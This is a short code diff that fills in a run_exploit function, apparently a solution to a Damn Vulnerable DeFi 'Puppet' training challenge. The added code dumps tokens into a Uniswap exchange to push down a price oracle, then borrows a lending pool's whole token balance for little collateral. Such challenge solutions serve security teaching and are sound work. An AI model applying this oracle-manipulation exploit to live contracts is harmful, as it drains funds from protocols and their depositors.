@@ -100,7 +100,18 @@ def deploy_uniswap_contract(file_name):
 def run_exploit():
     # remove pass and add exploit code here
     # attacker = accounts[1] - account to be used for exploit
-    pass
+    attacker = accounts[1]
+    amount_to_trade = Wei("9.9 ether")
+    DamnValuableToken[-1].approve(dvt_uniswap_exchange.address, "1000 ether",
+                              {"from": attacker})
+    tx = dvt_uniswap_exchange.tokenToEthTransferInput(Wei("1000 ether"),
+                                                      Wei("9.8 ether"),
+                                                      deadline, 
+                                                      attacker.address,
+                                                      {"from": attacker})
+    borrowAmount = DamnValuableToken[-1].balanceOf(PuppetPool[-1].address)
+    PuppetPool[-1].borrow(borrowAmount, {"from": attacker,
+                                         "value": Wei("19.8 ether")})
 
 
 def after():
